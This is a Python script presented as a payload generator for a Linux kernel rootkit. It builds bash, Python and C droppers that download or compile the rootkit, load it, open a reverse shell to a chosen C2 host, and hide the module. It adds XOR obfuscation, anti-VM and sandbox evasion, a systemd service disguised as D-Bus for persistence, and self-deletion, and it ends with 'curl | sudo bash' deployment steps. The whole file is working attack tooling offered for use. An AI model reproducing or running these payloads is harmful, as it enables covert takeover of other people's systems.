#!/usr/bin/env python3
"""
rooteame Payload Generator v3.0
Interactive builder for kernel rootkit delivery payloads.
Auto-detects local IP, generates obfuscated multi-format payloads
with anti-VM evasion and persistence.

ruby570bocadito (c) 2026
"""

import os, sys, socket, struct, subprocess, base64, random, textwrap, shutil
from pathlib import Path
from datetime import datetime

ROOT = Path(__file__).resolve().parent.parent
SRC  = ROOT / "src"
OUT  = Path(__file__).resolve().parent

# ================================================================
# Utilities
# ================================================================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def gen_key(length=16):
    return "".join(chr(random.randint(65, 90)) for _ in range(length))

# ================================================================
# Anti-VM checks (shell snippet)
# ================================================================
ANTI_VM = r"""
_anti_vm() {
    for d in /dev/vda /dev/xvda; do [ -e "$d" ] && return 0; done
    if [ -f /sys/class/dmi/id/product_name ]; then
        case "$(cat /sys/class/dmi/id/product_name 2>/dev/null|tr '[:upper:]' '[:lower:]')" in
            *virtualbox*|*vmware*|*qemu*|*kvm*|*bochs*|*hyper-v*|*innotek*) return 0 ;;
        esac
    fi
    grep -qi hypervisor /proc/cpuinfo 2>/dev/null && return 0
    ip link show 2>/dev/null|grep -qiE "(08:00:27|00:0c:29|00:50:56|00:1c:42|00:05:69)" && return 0
    return 1
}
if _anti_vm; then exit 0; fi
"""

# ================================================================
# Persistence code (shell)
# ================================================================
PERSISTENCE = r"""
_persist() {
    local T="$1"
    local INSTALLED=0
    if command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/dbus-system.service << 'SVC'
[Unit]
Description=D-Bus System Message Bus
After=network.target
[Service]
Type=forking
ExecStartPre=/bin/sleep $(shuf -i 20-90 -n 1)
ExecStart=/sbin/insmod SVC
ExecStartPost=/bin/rm -f /etc/systemd/system/multi-user.target.wants/dbus-system.service
Restart=no
[Install]
WantedBy=multi-user.target
SVC
        sed -i "s|SVC|${T}/rooteame.ko|" /etc/systemd/system/dbus-system.service
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable dbus-system.service 2>/dev/null && INSTALLED=1
    fi
    if [ "$INSTALLED" = "0" ] && [ -f /etc/rc.local ]; then
        grep -q rooteame /etc/rc.local 2>/dev/null || \
            echo "/sbin/insmod ${T}/rooteame.ko" >> /etc/rc.local
    fi
}
_persist "$T"
"""

# ================================================================
# Bash inline dropper
# ================================================================
def build_bash(host, port, xorkey="", anti_vm=True, persistence=True, obfuscate=True):
    import tarfile, io

    # Pack kernel source
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
        for f in sorted(SRC.glob("*")):
            if f.suffix in (".c", ".h") or f.name == "Makefile":
                tar.add(f, arcname=f.name)
    raw = tar_buf.getvalue()

    if obfuscate and xorkey:
        raw = xor(raw, xorkey.encode())
        b64 = base64.b64encode(raw).decode()
        decode = f'python3 -c "import sys;d=sys.stdin.buffer.read();k=b\'{xorkey}\';sys.stdout.buffer.write(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"'
        extract = f'echo "$T" | base64 -d | {decode} | tar xzf -'
    else:
        b64 = base64.b64encode(raw).decode()
        decode = ""
        extract = 'echo "$T" | base64 -d | tar xzf -'

    script = f'''#!/bin/bash
# rooteame dropper v3.0 — kernel rootkit implant
set -e
export T="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
export H="{host}" P="{port}"
T="{b64}"

_s(){{ logger -t "systemd-coredump" "$1" 2>/dev/null||true; }}

# Anti-VM
{ANTI_VM if anti_vm else ":"}

# Deps
_s "setup"
command -v gcc >/dev/null 2>&1||{{ apt-get update -qq&&apt-get install -y -qq build-essential linux-headers-$(uname -r) 2>/dev/null; }}

# Extract & build
_s "extract"
mkdir -p "$T"&&cd "$T"
{extract}
_s "build"
make clean >/dev/null 2>&1||true
make >/dev/null 2>&1||{{ _s "build failed";exit 1; }}

# Load
_s "load"
/sbin/insmod rooteame.ko 2>/dev/null
for i in $(seq 1 10);do [ -e /dev/rooteame ]&&break;sleep 0.1;done

# Hide module + trigger shell
python3 -c "
import fcntl,os
fd=os.open('/dev/rooteame',2)
fcntl.ioctl(fd,(0<<30)|(0xC0<<8)|0x0D)
os.close(fd)
fd=os.open('/dev/rooteame',2)
buf=b'$H:$P\x00'.ljust(256,b'\x00')
fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
os.close(fd)
" 2>/dev/null||true
_s "shell triggered -> $H:$P"

# Persist
{generate_persistence(persistence)}

# Hide dir + self-destruct
python3 -c "
import fcntl,os
fd=os.open('/dev/rooteame',2)
fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x02,'$(basename "$T")\x00'.ljust(256,b'\x00'))
os.close(fd)
" 2>/dev/null||true
rm -f "$0" 2>/dev/null||true
_s "done"
exit 0
'''
    return script.strip() + "\n"


def generate_persistence(enable):
    if not enable:
        return "# no persistence"
    return PERSISTENCE


# ================================================================
# Python stager
# ================================================================
def build_python(host, port):
    return f'''#!/usr/bin/env python3
import os,sys,platform,struct,fcntl,urllib.request,tempfile,time
H,P="{host}","{port}"
C2=f"http://{{H}}:8080/rooteame-{{platform.release()}}-{{platform.machine()}}.ko"
try:
 if os.geteuid():os.execvp("sudo",["sudo",sys.executable]+sys.argv)
 k=urllib.request.urlopen(C2,timeout=30).read()
 t=tempfile.mkdtemp(prefix=".x");p=os.path.join(t,"r.ko")
 open(p,"wb").write(k)
 os.system(f"/sbin/insmod {{p}} 2>/dev/null")
 time.sleep(.5)
 for i in range(10):
  if os.path.exists("/dev/rooteame"):break
  time.sleep(.1)
 fd=os.open("/dev/rooteame",2)
 buf=f"{{H}}:{{P}}".encode().ljust(256,b"\\0")
 fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
 os.close(fd)
 fcntl.ioctl(os.open("/dev/rooteame",2),(0<<30)|(0xC0<<8)|0x0D)
 os.unlink(__file__)
 print(f"[+] Shell -> {{H}}:{{P}}")
except Exception as e:print(f"[-] {{e}}")
'''


# ================================================================
# C stager (source — compiles to ~15KB binary)
# ================================================================
def build_c(host, port):
    return f'''/*
 * rooteame stager v3.0 — minimal C downloader/loader
 * Compile: gcc -O2 -s -o stager stager.c -static
 * Size: ~15KB static, ~8KB dynamic
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define C2 "{host}"
#define PORT "{port}"

/* IOCTL values matching kernel module */
#define IO_HIDE_MODULE  (((0UL)<<30)|((0xC0)<<8)|(0x0D))
#define IO_SHELL        (((1UL)<<30)|((256)<<16)|((0xC0)<<8)|(0x0B))

static int download(const char *url, unsigned char **out, size_t *olen) {{
    char host[256], path[512], request[1024];
    int port, sock, n;
    struct hostent *he;
    struct sockaddr_in addr;
    unsigned char buf[4096];
    size_t total = 0;

    *out = NULL;
    *olen = 0;

    if (sscanf(url, "http://%255[^:/]%d%511s", host, &port, path) < 1)
        if (sscanf(url, "http://%255[^/]%511s", host, path) < 1) return -1;
    if (port <= 0 || port > 65535) port = 80;
    if (path[0] == '\\0') strcpy(path, "/");

    he = gethostbyname(host);
    if (!he || !he->h_addr_list[0]) return -1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {{ close(sock); return -1; }}

    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\\r\\nHost: %s\\r\\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\\r\\n"
        "Accept: text/html\\r\\nConnection: close\\r\\n\\r\\n",
        path, host);

    write(sock, request, strlen(request));

    for (;;) {{
        n = read(sock, buf, sizeof(buf));
        if (n <= 0) break;

        char *body = strstr((char *)buf, "\\r\\n\\r\\n");
        if (body) {{
            body += 4;
            size_t hdr_len = body - (char *)buf;
            if ((size_t)n > hdr_len) {{
                size_t blen = n - hdr_len;
                *out = realloc(*out, total + blen);
                memcpy(*out + total, body, blen);
                total += blen;
            }}
            if (n > hdr_len) continue;
        }}
        *out = realloc(*out, total + n);
        memcpy(*out + total, buf, n);
        total += n;
    }}
    close(sock);
    if (total == 0 || !*out) return -1;
    *olen = total;
    return 0;
}}

int main(int argc, char **argv) {{
    unsigned char *data = NULL;
    size_t len = 0;
    char ko[128], hostport[256];
    int fd, status;
    pid_t pid;

    signal(SIGCHLD, SIG_DFL);

    /* Fetch payload from C2 */
    printf("[*] Fetching rooteame.ko from C2...\\n");
    if (download("http://" C2 ":8080/rooteame.ko", &data, &len) < 0) {{
        fprintf(stderr, "[-] Download failed\\n");
        return 1;
    }}
    printf("[+] Downloaded %zu bytes\\n", len);

    /* Write .ko */
    snprintf(ko, sizeof(ko), "/tmp/.%.8s.ko", argv[0] + (strlen(argv[0]) > 10 ? strlen(argv[0]) - 10 : 0));
    fd = open(ko, O_WRONLY|O_CREAT|O_TRUNC, 0600);
    if (fd < 0) {{ perror("open"); free(data); return 1; }}
    write(fd, data, len);
    close(fd);
    free(data);

    /* Load via insmod */
    pid = fork();
    if (pid == 0) {{
        execl("/sbin/insmod", "insmod", ko, NULL);
        _exit(1);
    }}
    waitpid(pid, &status, 0);
    if (WEXITSTATUS(status) != 0) {{
        fprintf(stderr, "[-] insmod failed (exit=%d)\\n", WEXITSTATUS(status));
        unlink(ko);
        return 1;
    }}
    printf("[+] Module loaded\\n");

    /* Trigger reverse shell */
    sleep(1);
    for (int i = 0; i < 10; i++) {{
        fd = open("/dev/rooteame", O_RDWR);
        if (fd >= 0) break;
        usleep(100000);
    }}
    if (fd >= 0) {{
        memset(hostport, 0, sizeof(hostport));
        snprintf(hostport, sizeof(hostport), "%s:%s", C2, PORT);
        ioctl(fd, IO_SHELL, hostport);
        ioctl(fd, IO_HIDE_MODULE);
        close(fd);
        printf("[+] Reverse shell -> %s:%s\\n", C2, PORT);
    }} else {{
        fprintf(stderr, "[-] /dev/rooteame not found\\n");
    }}

    /* Cleanup */
    unlink(ko);
    printf("[+] Clean exit\\n");

    return 0;
}}
'''


# ================================================================
# CLI mode
# ================================================================
def cli():
    import argparse
    p = argparse.ArgumentParser(description="rooteame v3.0 Payload Generator")
    p.add_argument("--host", help="C2 IP for reverse shell callback")
    p.add_argument("--port", default="4444", help="C2 port")
    p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
    p.add_argument("--output", help="Output file path (auto-appends extension)")
    p.add_argument("--no-anti-vm", action="store_true")
    p.add_argument("--no-obfuscate", action="store_true")
    p.add_argument("--no-persistence", action="store_true")
    p.add_argument("--xorkey", default="")
    args = p.parse_args()

    host = args.host or get_local_ip()
    port = args.port
    av = not args.no_anti_vm
    ob = not args.no_obfuscate
    per = not args.no_persistence
    key = args.xorkey or (gen_key() if ob else "")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fmts = ["bash", "python", "c"] if args.format == "all" else [args.format]
    ext_map = {"bash": ".sh", "python": ".py", "c": ".c"}

    for fmt in fmts:
        ext = ext_map[fmt]
        path = (args.output or str(OUT / f"{fmt}_stager_{ts}")) + ext

        builders = {"bash": lambda: build_bash(host, port, key, av, per, ob),
                     "python": lambda: build_python(host, port),
                     "c": lambda: build_c(host, port)}

        content = builders[fmt]()
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, 0o755)
        print(f"[+] {fmt.upper():6s} {path} ({os.path.getsize(path)/1024:.1f} KB)")

    print(f"\n[*] Listener:     nc -lvnp {port}")
    print(f"[*] Serve files:  cd {OUT} && python3 -m http.server 8080")


# ================================================================
# Interactive mode
# ================================================================
def interactive():
    print("""
  rooteame — Payload Generator v3.0
  ruby570bocadito (c) 2026
""")
    local_ip = get_local_ip()
    print(f"  Detected IP: {local_ip}\n")
    host = input(f"  C2 IP [{local_ip}]: ").strip() or local_ip
    port = input("  C2 port [4444]: ").strip() or "4444"

    print("\n  Format:")
    print("    1) bash dropper  (inline, self-compiling, ~20KB)")
    print("    2) python stager (downloads .ko from C2, ~1KB)")
    print("    3) C stager       (compiles to ~15KB binary)")
    print("    4) ALL formats")
    fmt = {"1":"bash","2":"python","3":"c","4":"all"}.get(input("  Choice [1]: ").strip() or "1", "bash")

    av = input("\n  Anti-VM / sandbox evasion? [Y/n]: ").strip().lower() != "n"
    ob = input("  XOR obfuscate embedded payload? [Y/n]: ").strip().lower() != "n"
    key = ""
    if ob:
        key = input("  XOR key (enter for random): ").strip()
        if not key:
            key = gen_key()
            print(f"  Generated key: {key}")

    per = input("\n  Install persistence (survive reboot)? [Y/n]: ").strip().lower() != "n"

    odir = input(f"\n  Output directory [{OUT}]: ").strip() or str(OUT)
    os.makedirs(odir, exist_ok=True)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fmts = ["bash","python","c"] if fmt == "all" else [fmt]
    ext_map = {"bash": ".sh", "python": ".py", "c": ".c"}
    generated = []

    for f in fmts:
        ext = ext_map[f]
        path = os.path.join(odir, f"{f}_stager_{ts}{ext}")
        builders = {"bash": lambda: build_bash(host, port, key, av, per, ob),
                     "python": lambda: build_python(host, port),
                     "c": lambda: build_c(host, port)}
        content = builders[f]()
        with open(path, "w") as fh:
            fh.write(content)
        os.chmod(path, 0o755)
        generated.append((f, path))

    print(f"\n  === Generated Payloads ===\n")
    for fmt_name, fpath in generated:
        print(f"  [{fmt_name.upper():6s}] {fpath}  ({os.path.getsize(fpath)/1024:.1f} KB)")

    print(f"""
  === Deployment ===
  1. Listener:  nc -lvnp {port}
  2. Serve:     cd {odir} && python3 -m http.server 8080
  3. Deploy:    curl -s http://{host}:8080/{os.path.basename(generated[0][1])} | sudo bash
  """)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()
    else:
        interactive()
